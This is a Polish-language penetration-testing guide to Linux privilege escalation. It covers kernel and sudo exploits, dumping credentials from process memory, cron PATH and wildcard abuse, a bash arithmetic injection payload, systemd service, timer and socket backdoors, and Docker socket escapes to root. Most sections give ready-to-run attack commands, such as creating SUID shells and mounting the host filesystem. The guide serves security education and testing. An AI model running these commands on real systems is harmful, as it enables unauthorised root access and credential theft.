# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy od zebrania informacji o działającym systemie operacyjnym
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Jeśli masz uprawnienia zapisu w dowolnym folderze znajdującym się w zmiennej `PATH`, możesz przejąć niektóre biblioteki lub pliki binarne:
```bash
echo $PATH
```
### Env info

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub API keys?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź kernel version i czy istnieje exploit, który można wykorzystać do escalate privileges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych kernel i niektóre już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) oraz [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, gdzie możesz znaleźć niektóre **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje kernela z tej strony możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchomić na ofierze, sprawdza tylko exploits dla jądra 2.x)

Zawsze **wyszukaj wersję jądra w Google**, być może twoja wersja jądra jest wymieniona przy jakimś kernel exploit i wtedy będziesz mieć pewność, że exploit będzie działać.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Na podstawie podatnych wersji sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Wersje Sudo wcześniejsze niż 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) pozwalają nieuprzywilejowanym lokalnym użytkownikom na podniesienie uprawnień do root za pomocą opcji sudo `--chroot`, gdy plik `/etc/nsswitch.conf` jest używany z katalogu kontrolowanego przez użytkownika.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploit upewnij się, że Twoja wersja `sudo` jest podatna i że obsługuje funkcję `chroot`.

Aby uzyskać więcej informacji, zapoznaj się z oryginalnym [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: weryfikacja podpisu nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład**, jak ten vuln mógł zostać wykorzystany.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wylicz możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli znajdujesz się wewnątrz docker container możesz spróbować z niego uciec:

{{#ref}}
docker-security/
{{#endref}}

## Dyski

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy nie zawiera prywatnych informacji
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaria
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź też, czy **jakikolwiek kompilator jest zainstalowany**. Jest to przydatne, jeśli będziesz musiał użyć jakiegoś kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Być może jest tam jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do escalating privileges…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz również użyć **openVAS**, aby sprawdzić przestarzałe i podatne oprogramowanie zainstalowane na maszynie.

> [!NOTE] > _Zauważ, że te polecenia wyświetlą dużo informacji, które w większości będą bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy któraś z zainstalowanych wersji oprogramowania jest podatna na znane exploits_

## Procesy

Sprawdź, jakie **procesy** są uruchomione i zweryfikuj, czy któryś proces ma **więcej uprawnień niż powinien** (może tomcat jest uruchomiony przez root?).
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj możliwe [**electron/cef/chromium debuggers** działające — możesz je wykorzystać do eskalacji uprawnień](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w linii poleceń procesu.\
Sprawdź też swoje uprawnienia względem binariów procesów — być może możesz nadpisać któryś z nich.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikacji podatnych procesów uruchamianych często lub gdy spełnione są określone warunki.

### Pamięć procesu

Niektóre usługi serwera zapisują **credentials w postaci jawnego tekstu w pamięci**.\
Zazwyczaj będziesz potrzebować **uprawnień root**, aby czytać pamięć procesów należących do innych użytkowników, dlatego zwykle jest to bardziej przydatne, gdy już masz uprawnienia root i chcesz odkryć więcej credentials.\
Jednak pamiętaj, że **jako zwykły użytkownik możesz czytać pamięć procesów, które posiadasz**.

> [!WARNING]
> Zauważ, że obecnie większość maszyn **nie zezwala domyślnie na ptrace**, co oznacza, że nie możesz zrzucać innych procesów należących do nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. To klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: tylko proces macierzysty może być debugowany.
> - **kernel.yama.ptrace_scope = 2**: Tylko admin może używać ptrace, ponieważ wymaga to capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Żadne procesy nie mogą być śledzone przez ptrace. Po ustawieniu wymagane jest ponowne uruchomienie, aby ponownie włączyć ptrace.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz uzyskać Heap i przeszukać w nim credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu, **maps pokazuje, jak pamięć jest mapowana w przestrzeni adresowej tego procesu**; pokazuje też **uprawnienia każdej zmapowanej sekcji**. Pseudo-plikiem **mem** jest plik, który **udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **obszary pamięci są czytelne** i ich offsety. Wykorzystujemy te informacje, aby **przesunąć wskaźnik w pliku mem i zrzucić wszystkie czytelne obszary** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do systemowej **pamięci fizycznej**, a nie pamięci wirtualnej. Wirtualną przestrzeń adresową jądra można uzyskać za pomocą /dev/kmem.\
Zwykle `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla Linux

ProcDump to wersja na Linux klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz ją z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu, możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania root i zrzucić proces należący do ciebie
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli stwierdzisz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz dump procesu (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby dumpowania pamięci procesu) i przeszukać pamięć w poszukiwaniu poświadczeń:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) będzie **kraść poświadczenia w postaci jawnego tekstu z pamięci** oraz z niektórych **znanych plików**. Wymaga uprawnień root, aby działać poprawnie.

| Funkcja                                           | Nazwa procesu        |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane/Cron zadania

### Crontab UI (alseambusher) uruchomiony jako root – web-based scheduler privesc

Jeśli panel webowy “Crontab UI” (alseambusher/crontab-ui) działa jako root i jest związany tylko z loopback, wciąż możesz uzyskać do niego dostęp przez SSH local port-forwarding i stworzyć uprzywilejowane zadanie, żeby eskalować.

Typowy łańcuch
- Odkryj port dostępny tylko na loopback (np. 127.0.0.1:8000) i Basic-Auth realm za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź dane uwierzytelniające w artefaktach operacyjnych:
- Kopie zapasowe/skrypty z `zip -P <password>`
- jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunel i logowanie:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz wysoko uprzywilejowane zadanie i uruchom natychmiast (tworzy SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
- Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
- Avoid embedding secrets in unit files; use secret stores or root-only EnvironmentFile
- Enable audit/logging for on-demand job executions

Sprawdź, czy któreś z zaplanowanych zadań jest podatne. Może uda się wykorzystać skrypt uruchamiany przez root (wildcard vuln? czy możesz modyfikować pliki, których używa root? użyć symlinks? stworzyć określone pliki w katalogu, którego używa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Na przykład, w _/etc/crontab_ możesz znaleźć zmienną PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik "user" ma prawa zapisu do /home/user_)

Jeśli w tym crontab użytkownik root próbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany przez root zawiera “**\***” w poleceniu, można to wykorzystać do wykonania nieoczekiwanych rzeczy (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash wykonuje rozszerzanie parametrów i substytucję poleceń przed ewaluacją arytmetyczną w ((...)), $((...)) i let. Jeśli rootowy cron/parser odczytuje niezaufane pola logu i przekazuje je do kontekstu arytmetycznego, atakujący może wstrzyknąć command substitution $(...), który wykona się jako root, gdy cron zostanie uruchomiony.

- Dlaczego to działa: W Bashu rozszerzenia zachodzą w tej kolejności: rozszerzanie parametrów/zmiennych, substytucja poleceń, rozszerzenie arytmetyczne, następnie dzielenie na słowa i rozszerzanie nazw ścieżek. Zatem wartość typu `$(/bin/bash -c 'id > /tmp/pwn')0` jest najpierw podstawiona (uruchamiając polecenie), a pozostała część numeryczna `0` jest użyta do operacji arytmetycznej, więc skrypt kontynuuje bez błędów.

- Typowy podatny wzorzec:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacja: Spraw, by tekst kontrolowany przez atakującego został zapisany w parsowanym logu tak, aby pole wyglądające na numeryczne zawierało command substitution i kończyło się cyfrą. Upewnij się, że Twoje polecenie nie wypisuje nic na stdout (lub przekieruj wyjście), żeby operacja arytmetyczna pozostała ważna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Jeśli możesz zmodyfikować skrypt cron uruchamiany jako root, możesz bardzo łatwo uzyskać shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli script uruchamiany przez root korzysta z **directory, do którego masz pełny dostęp**, może być przydatne usunięcie tego folderu i **utworzenie symlink folderu wskazującego na inny**, który serwuje script kontrolowany przez Ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste cron jobs

Możesz monitorować procesy, aby wyszukać te, które są uruchamiane co 1, 2 lub 5 minut. Być może możesz to wykorzystać i escalate privileges.

Na przykład, aby **monitorować co 0.1s przez 1 minutę**, **posortować według najmniej wykonywanych poleceń** i usunąć polecenia, które zostały wykonane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz także użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (będzie monitorować i wypisywać każdy uruchamiany proces).

### Niewidoczne cron jobs

Możliwe jest utworzenie cronjob poprzez **wstawienie znaku powrotu karetki po komentarzu** (bez znaku nowej linii), i cron job będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Pliki _.service_ z prawem zapisu

Sprawdź, czy możesz zapisać dowolny plik `.service`; jeśli tak, możesz go **zmodyfikować**, aby **wykonywał** twój **backdoor gdy** usługa zostanie **uruchomiona**, **zrestartowana** lub **zatrzymana** (może być konieczne poczekać na restart maszyny).\
Na przykład stwórz swój backdoor wewnątrz pliku .service za pomocą **`ExecStart=/tmp/script.sh`**

### Pliki binarne usług z prawem zapisu

Pamiętaj, że jeśli masz **uprawnienia zapisu do binarek uruchamianych przez usługi**, możesz je zmienić na backdoors, więc gdy usługi zostaną ponownie uruchomione, backdoors zostaną wykonane.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli okaże się, że możesz **zapisywać** w którymkolwiek folderze na tej ścieżce, możesz być w stanie **escalate privileges**. Musisz wyszukać **ścieżek względnych używanych w plikach konfiguracji usług** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie stwórz **wykonywalny plik** o **tej samej nazwie co binarka wskazana względną ścieżką** wewnątrz katalogu PATH systemd, do którego masz prawa zapisu, i gdy serwis zostanie poproszony o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twój **backdoor zostanie wykonany** (użytkownicy bez uprawnień zwykle nie mogą uruchamiać/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach używając `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, które kontrolują pliki lub zdarzenia `**.service**`. **Timery** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń kalendarzowych oraz zdarzeń monotonicznych i mogą być uruchamiane asynchronicznie.

Możesz wyświetlić wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że uruchomi istniejące jednostki systemd.unit (np. `.service` lub `.target`)
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest jednostka:

> Jednostka do aktywacji, gdy ten timer wygaśnie. Argumentem jest nazwa jednostki, której sufiks nie jest ".timer". Jeśli nie zostanie określona, ta wartość domyślnie wskazuje na service o tej samej nazwie co jednostka timera, z wyjątkiem sufiksu. (Patrz wyżej.) Zaleca się, aby nazwa jednostki, która jest aktywowana, oraz nazwa jednostki timera były identyczne, z wyjątkiem sufiksu.

Dlatego, aby nadużyć tego uprawnienia, musiałbyś:

- Znaleźć jednostkę systemd (np. `.service`), która **uruchamia plik binarny, do którego masz prawa zapisu**
- Znaleźć jednostkę systemd, która **uruchamia względną ścieżkę** i masz **prawa zapisu** do **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień root i musisz wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zauważ, że **timer** jest **aktywowany** przez utworzenie symlinku do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tej samej lub na różnych maszynach w modelach klient‑serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.

Sockets można konfigurować przy użyciu plików `.socket`.

**Dowiedz się więcej o sockets używając `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje się różnią, ale ogólnie służą do **wskazania, gdzie będzie nasłuchiwany** socket (ścieżka pliku AF_UNIX socket, adres IPv4/6 i/lub numer portu do nasłuchiwania, itp.)
- `Accept`: Przyjmuje argument boolean. Jeśli **true**, dla każdego przychodzącego połączenia tworzona jest **instancja usługi** i przekazywany jest do niej tylko socket połączenia. Jeśli **false**, wszystkie nasłuchujące sockety są **przekazywane uruchamianej jednostce service**, i tworzona jest tylko jedna jednostka service dla wszystkich połączeń. Ta wartość jest ignorowana dla socketów datagramowych i FIFO, gdzie jedna jednostka service bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie false**. Ze względów wydajnościowych zaleca się pisać nowe demony w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **socketów**/FIFO, odpowiednio. Pierwszy token linii poleceń musi być bezwzględną ścieżką do pliku, po czym następują argumenty dla procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **socketów**/FIFO, odpowiednio.
- `Service`: Określa nazwę jednostki **service**, którą należy **aktywować** przy **przychodzącym ruchu**. To ustawienie jest dozwolone tylko dla socketów z Accept=no. Domyślnie używana jest jednostka service o tej samej nazwie co socket (z odpowiednio zmienionym sufiksem). W większości przypadków nie ma potrzeby używania tej opcji.

### Pliki `.socket` z prawem zapisu

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w stylu: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie uruchomiony przed utworzeniem socketu. W związku z tym **prawdopodobnie będziesz musiał poczekać na restart maszyny.**  
_Uwaga: system musi używać tej konfiguracji pliku socket, inaczej backdoor nie zostanie uruchomiony_

### Zapisywalne gniazda

Jeśli **znajdziesz jakiekolwiek zapisywalne gniazdo** (_mówimy tu o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym socketem i być może wykorzystać jakąś podatność.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zauważ, że mogą istnieć **sockets nasłuchujące żądań HTTP** (_Nie mówię o plikach .socket, lecz o plikach działających jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli socket **odpowiada na żądania HTTP**, możesz **komunikować się** z nim i być może **wykorzystać jakąś lukę**.

### Zapisywalny socket Dockera

Socket Dockera, często znajdujący się w `/var/run/docker.sock`, to krytyczny plik, który należy zabezpieczyć. Domyślnie jest zapisywalny dla użytkownika `root` oraz członków grupy `docker`. Posiadanie dostępu zapisu do tego socketu może prowadzić do privilege escalation. Poniżej znajduje się omówienie, jak można to zrobić oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation with Docker CLI**

Jeśli masz dostęp zapisu do socketu Dockera, możesz przeprowadzić privilege escalation, używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z dostępem root do systemu plików hosta.

#### **Używanie Docker API bezpośrednio**

W przypadkach, gdy Docker CLI nie jest dostępny, gniazdo Docker można nadal manipulować przy pomocy Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, które montuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Uruchom nowo utworzony kontener:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem i umożliwić wykonywanie poleceń wewnątrz niego.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po skonfigurowaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z dostępem root do systemu plików hosta.

### Inne

Zauważ, że jeśli masz uprawnienia zapisu do docker socket ponieważ jesteś **inside the group `docker`** masz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **more ways to break out from docker or abuse it to escalate privileges** w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Jeśli możesz użyć polecenia **`ctr`** przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Jeśli możesz użyć polecenia **`runc`** przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


